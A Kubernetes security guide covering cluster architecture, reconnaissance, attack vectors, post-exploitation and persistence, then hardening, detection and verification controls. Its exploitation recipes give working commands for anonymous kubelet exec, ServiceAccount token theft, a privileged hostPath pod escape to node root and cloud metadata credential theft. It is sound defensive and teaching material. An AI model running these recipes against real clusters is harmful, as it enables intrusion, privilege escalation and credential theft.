# Kubernetes Fundamentals

## 1. Overview

Kubernetes is a container orchestration platform that schedules, runs, and manages containerized workloads across a cluster of nodes. A cluster has two logical halves: the control plane (decision-making) and the worker nodes (execution).

The control plane components:

- **kube-apiserver** - the single entry point for all API operations. Every `kubectl` command, every controller, and every kubelet talks to it. It authenticates requests, authorizes them through RBAC or other authorizers, and applies admission controllers before persisting objects to etcd.
- **etcd** - the distributed key-value store that holds the entire cluster state. Access to etcd (especially with client certificates) is equivalent to cluster-admin, because an attacker can read all Secrets and modify all objects directly.
- **kube-scheduler** - assigns Pods to nodes based on resource requests, taints, tolerations, affinity rules, and topology constraints.
- **kube-controller-manager** - runs the reconciliation loops (Deployment, ReplicaSet, Node, ServiceAccount token, and many others).
- **cloud-controller-manager** - integrates the cluster with the cloud provider (load balancers, routes, node lifecycle).

The worker node components:

- **kubelet** - the node agent. It receives PodSpecs from the API server and ensures the containers are running. The kubelet exposes its own API on port 10250 (and read-only on 10255 in older versions), which is a common attack surface when anonymous access is enabled.
- **kube-proxy** - implements Service networking (iptables, IPVS, or nftables rules) on each node.
- **Container runtime** - containerd, CRI-O, or Docker (deprecated as a runtime). The runtime pulls images and starts containers through the Container Runtime Interface (CRI).

Workload objects:

- **Pod** - the smallest deployable unit, one or more containers sharing a network namespace and storage volumes.
- **Deployment / ReplicaSet** - stateless workloads with rolling updates.
- **StatefulSet** - stateful workloads with stable identity and persistent storage.
- **DaemonSet** - one Pod per node, used for node-level agents (logging, monitoring, CNI).
- **Job / CronJob** - batch workloads.
- **Service** - stable virtual IP and DNS name in front of a set of Pods (ClusterIP, NodePort, LoadBalancer).
- **Ingress** - HTTP(S) routing from outside the cluster to Services.
- **ConfigMap / Secret** - configuration and sensitive data, mounted as volumes or exposed as environment variables.

## 2. Reconnaissance and Enumeration

The first question for any Kubernetes target is: where is the API server, and can I talk to it?

External reconnaissance:

- Scan for the API server on 6443 (default), 8443, 443, and custom ports. Managed clusters (EKS, GKE, AKS) may expose the API server publicly or only through a private endpoint.
- Scan for kubelet on 10250 (authenticated) and 10255 (read-only, legacy). A 10255 response is a strong signal of an old or misconfigured cluster.
- Scan for the Kubernetes Dashboard on 30000-32767 (NodePort range) or behind an Ingress.
- Scan for etcd on 2379 (client) and 2380 (peer). Exposed etcd with client auth disabled is a full cluster compromise.

Banner and version fingerprints:

- `curl -k https://<api>:6443/version` returns the Kubernetes version without authentication (it is part of the public discovery API in many configurations). This identifies the minor version, which maps to known CVEs.
- `curl -k https://<api>:6443/api` and `/apis` list the API groups. An unauthenticated 200 here means anonymous access is enabled (rare but seen in lab clusters).
- The API server's `/healthz`, `/livez`, `/readyz` endpoints are often unauthenticated and confirm the target is Kubernetes.

Authenticated enumeration (after obtaining a token or kubeconfig):

- `kubectl auth can-i --list` - what the current identity can do.
- `kubectl get nodes,namespaces,pods,deployments,daemonsets -A` - full inventory.
- `kubectl get secrets -A` - every Secret, base64-decoded with `kubectl get secret <name> -o jsonpath='{.data}'`.
- `kubectl get serviceaccounts -A` - ServiceAccount inventory.
- `kubectl get clusterrolebindings,rolebindings -A` - who is bound to what.
- `kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {.spec.serviceAccountName}{"\n"}{end}'` - which workload runs as which ServiceAccount.

kubelet enumeration (when 10250 is reachable and anonymous auth is on):

- `curl -k https://<node>:10250/pods` - list all Pods on that node.
- `curl -k https://<node>:10250/run/<namespace>/<pod>/<container> -d "cmd=id"` - execute a command in a container (this is the kubelet exec API; if anonymous auth is enabled, this is unauthenticated RCE).

## 3. Common Attack Vectors

The Kubernetes attack surface splits into four layers: external exposure, identity and authorization, workload configuration, and node/runtime.

External exposure:

- Publicly reachable API server with weak authentication (anonymous auth, no OIDC, static token files).
- Exposed kubelet (10250 anonymous, 10255 read-only).
- Exposed etcd (2379 without client cert auth).
- Kubernetes Dashboard without authentication or with a weak token.
- Misconfigured Ingress exposing internal services.

Identity and authorization:

- Overly permissive RBAC: `cluster-admin` bound to a default ServiceAccount, wildcard verbs and resources, `create pods` in a namespace that allows hostPath or privileged.
- ServiceAccount token theft: tokens mounted into Pods are readable by anyone with `exec` or `get pods` in that namespace; a stolen token is a valid cluster identity.
- Cloud IAM integration abuse: IRSA on EKS (ServiceAccount annotated with an IAM role), Workload Identity on GKE (Kubernetes ServiceAccount bound to a Google Service Account), Pod Identity on AKS. A stolen token can assume the cloud role.
- OIDC misconfiguration: a cluster trusting an external OIDC provider that an attacker can control.

Workload configuration:

- Privileged containers (`securityContext.privileged: true`) - full host access.
- hostPath mounts (`/`, `/var/run/docker.sock`, `/var/run/containerd/containerd.sock`, `/proc`, `/sys`) - read or write host files, or talk to the container runtime directly.
- hostNetwork, hostPID, hostIPC - share the node's namespaces.
- `allowPrivilegeEscalation: true` with a setuid binary in the image.
- Missing Pod Security Standards / Pod Security Admission - no guardrails on what a Pod can request.

Node and runtime:

- Kernel exploits from inside a container (Dirty Pipe, Dirty COW, overlayfs CVEs).
- Container runtime vulnerabilities (runc CVE-2019-5736, CVE-2021-30465, containerd CVE-2020-15257).
- cgroup release_agent escape (requires privileged or specific cgroup v1 configuration).
- Docker/containerd socket access from inside a container.

## 4. Exploitation Recipes

**Recipe 1 - anonymous kubelet exec (10250 open, anonymous auth on):**

```bash
# List pods on the node
curl -sk https://10.0.0.10:10250/pods | jq '.items[].metadata.name'

# Execute a command inside a pod
curl -sk https://10.0.0.10:10250/run/default/nginx/id -d "cmd=id"
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Recipe 2 - ServiceAccount token theft and privilege check:**

```bash
# From inside a compromised pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# What can this token do?
kubectl --token=$TOKEN --server=$APISERVER auth can-i --list
```

Expected output:

```text
Resources   Non-Resource URLs   Resource Names   Verbs
pods        []                  []               [get list create]
secrets     []                  []               [get]
```

**Recipe 3 - privileged pod to node root (via hostPath):**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

```bash
kubectl apply -f escape.yaml
kubectl exec -it escape -- chroot /host /bin/bash
```

Expected output:

```text
root@node-1:/#
```

**Recipe 4 - cloud metadata from a Pod (IMDS abuse):**

```bash
# AWS IMDSv1 (if enabled)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2 (token required)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Expected output:

```text
eks-node-role
```

## 5. Post-Exploitation

Once inside a Pod, the goal depends on the stolen identity and the cluster configuration.

From a Pod with a ServiceAccount token:

- Enumerate RBAC with `kubectl auth can-i --list` and look for `create pods`, `get secrets`, `exec`, `impersonate`, `bind`.
- If `create pods` is allowed in a namespace where Pod Security Admission is weak, create a privileged Pod (Recipe 3) and escape to the node.
- If `get secrets` is allowed, read every Secret in scope; look for cloud credentials, database passwords, and other ServiceAccount tokens.
- If `exec` is allowed on other Pods, pivot to workloads with higher privileges.

From a node:

- Read `/var/lib/kubelet/kubeconfig` or `/etc/kubernetes/kubelet.conf` for the kubelet credentials (often cluster-wide read or more).
- Read `/etc/kubernetes/admin.conf` on control-plane nodes (full cluster-admin).
- Access the container runtime socket (`/run/containerd/containerd.sock`, `/var/run/docker.sock`) to start a new privileged container on the host.
- Read etcd data directly if the node is a control-plane node and etcd is not encrypted at rest (`/var/lib/etcd`).

Persistence:

- Create a new ServiceAccount with a ClusterRoleBinding to `cluster-admin` (if RBAC allows).
- Create a DaemonSet that runs on every node, giving persistent access across the cluster.
- Create a CronJob that re-establishes access if the initial foothold is removed.
- Add an admission webhook that injects a sidecar into every new Pod (very stealthy, requires `MutatingWebhookConfiguration` write).

## 6. Preventive Controls

Cluster hardening (applies to all managed and self-managed clusters):

- Disable anonymous authentication on the API server (`--anonymous-auth=false`) and on the kubelet (`--anonymous-auth=false`, `--authorization-mode=Webhook`).
- Enable NodeRestriction admission controller and require kubelet client certificates.
- Enforce RBAC least privilege: no `cluster-admin` for ServiceAccounts, no wildcards, no default ServiceAccount with permissions.
- Enable Pod Security Admission (PSA) with `restricted` or `baseline` profile on every namespace (`pod-security.kubernetes.io/enforce: restricted`).
- Use OPA/Gatekeeper or Kyverno to block privileged Pods, hostPath mounts, hostNetwork, and `allowPrivilegeEscalation`.
- Encrypt Secrets at rest (`EncryptionConfiguration` with aescbc or KMS provider).
- Enable audit logging with a policy that captures `exec`, `create pods`, `get secrets`, RBAC changes, and authentication failures.
- Restrict the API server network exposure: private endpoint, IP allowlist, or VPN-only access.
- Rotate ServiceAccount tokens; set `automountServiceAccountToken: false` on Pods that do not need API access.

Cloud-specific:

- AWS EKS: enable IRSA only where needed, scope IAM role trust policies to specific namespaces and ServiceAccounts, require IMDSv2, block Pod access to IMDS via network policy.
- GKE: use Workload Identity with narrowly scoped Google Service Accounts, enable Shielded GKE Nodes, enable GKE Sandbox (gVisor) for untrusted workloads.
- AKS: use Azure AD Workload Identity, disable local accounts, enable Azure Policy for AKS.

## 7. Detection Controls

API server audit log events to alert on:

- `create` on `pods` with `securityContext.privileged: true` or `hostPath` volumes.
- `create` on `clusterrolebindings` or `rolebindings` binding to `cluster-admin`.
- `get` or `list` on `secrets` across many namespaces in a short window.
- `create` on `pods/exec` or `pods/attach` into sensitive namespaces (`kube-system`).
- `create` on `mutatingwebhookconfigurations` or `validatingwebhookconfigurations`.
- Authentication failures (`401`) on the API server from unexpected source IPs.

kubelet and runtime signals:

- Access to `/pods` or `/run` on port 10250 from outside the node's Pod CIDR.
- Container process spawning a shell (`/bin/sh`, `/bin/bash`) when the image does not normally use one.
- Container accessing the container runtime socket.
- Container mounting the host filesystem or `/proc`.

Runtime detection tools:

- Falco (CNCF) - rule-based runtime detection for container and Kubernetes.
- Tetragon (Cilium) - eBPF-based observability and enforcement.
- Sysdig Secure - commercial runtime detection with Kubernetes context.

Cloud-native detection:

- AWS GuardDuty EKS Runtime Monitoring, AWS Security Hub.
- GCP Security Command Center with GKE threat detection.
- Azure Defender for Containers.

## 8. Verification

To verify the preventive controls are effective:

- Attempt to create a privileged Pod as a non-admin ServiceAccount. PSA `restricted` should reject it.
- Attempt to mount `hostPath: /` in a Pod. Gatekeeper/Kyverno should deny it.
- Attempt anonymous access to the API server (`curl -k https://<api>:6443/api`). Should return `401`.
- Attempt anonymous access to the kubelet (`curl -k https://<node>:10250/pods`). Should return `401` or connection refused.
- Check that Secrets are encrypted at rest: read the raw etcd value (if etcd access is available) and confirm it is not plaintext.
- Check audit log policy captures the expected events: trigger a `kubectl exec` and verify it appears in the audit log.

## 9. Cloud-Specific Considerations

The three major managed Kubernetes services share the same core but differ in identity integration and network exposure.

**Amazon EKS:**

- Control plane is managed by AWS; the customer manages nodes (EC2 or Fargate).
- IRSA (IAM Roles for Service Accounts) - the primary cloud identity mechanism. The ServiceAccount is annotated with `eks.amazonaws.com/role-arn`; the Pod receives a projected token that it exchanges for AWS credentials via STS.
- IMDS (instance metadata) is reachable from Pods by default unless blocked by network policy - a common privilege escalation path.
- EKS Pod Identity (2023) replaces IRSA for some use cases with a simpler trust model.

**Google GKE:**

- Control plane is managed; nodes are Compute Engine VMs or Autopilot-managed.
- Workload Identity - the Kubernetes ServiceAccount is bound to a Google Service Account via IAM binding. The Pod receives a metadata server token that maps to the GSA.
- GKE Sandbox (gVisor) provides kernel-level isolation for untrusted workloads.
- Autopilot mode enforces Pod Security Standards automatically.

**Azure AKS:**

- Control plane is managed; nodes are VMs in the customer subscription.
- Azure AD Workload Identity - the Kubernetes ServiceAccount is federated with an Azure AD application via OIDC.
- Local accounts (admin kubeconfig) can be disabled for Azure AD-only authentication.
- Azure Policy for AKS enforces cluster configuration.

## 10. Production Notes

- Treat the cluster as a security boundary only when RBAC, PSA, and network policies are correctly configured. A default Kubernetes install is not secure.
- Secrets in Kubernetes are base64-encoded, not encrypted, by default. Enable encryption at rest with a KMS provider, not just `aescbc`.
- ServiceAccount tokens are the most common privilege escalation vector. Audit every binding; default ServiceAccounts should have no permissions.
- Network policies are not enforced by default on most CNIs. Enable a CNI that supports NetworkPolicy (Calico, Cilium) and apply a default-deny policy per namespace.
- For multi-tenant clusters, use namespaces as the tenant boundary only if PSA `restricted` is enforced and the CNI supports NetworkPolicy. Otherwise use separate clusters.
- Back up etcd before any major upgrade; etcd loss is cluster loss.

## 11. References

- Kubernetes documentation - https://kubernetes.io/docs/
- Kubernetes API concepts - https://kubernetes.io/docs/reference/using-api/
- Kubernetes RBAC - https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- Pod Security Standards - https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Pod Security Admission - https://kubernetes.io/docs/concepts/security/pod-security-admission/
- Kubernetes Secrets encryption at rest - https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/
- CIS Kubernetes Benchmark - https://www.cisecurity.org/benchmark/kubernetes
- NSA/CISA Kubernetes Hardening Guide - https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
- NIST SP 800-190 Application Container Security Guide - https://csrc.nist.gov/publications/detail/sp/800-190/final
- OWASP Kubernetes Top 10 - https://owasp.org/www-project-kubernetes-top-ten/
- MITRE ATT&CK for Containers - https://attack.mitre.org/matrices/enterprise/containers/

## Certification Alignment

- CKA (Certified Kubernetes Administrator) - cluster architecture, workloads, services, networking, storage, troubleshooting.
- CKS (Certified Kubernetes Security Specialist) - cluster setup, cluster hardening, system hardening, microservice vulnerabilities, supply chain security, monitoring and logging.
- CompTIA Security+ - network security, identity, and access management fundamentals.
- AWS Certified Security - Specialty - IAM, IMDS, EKS security.
- Google Cloud Professional Cloud Security Engineer - GKE security, Workload Identity.
- Azure Security Engineer Associate - AKS security, Azure AD Workload Identity.
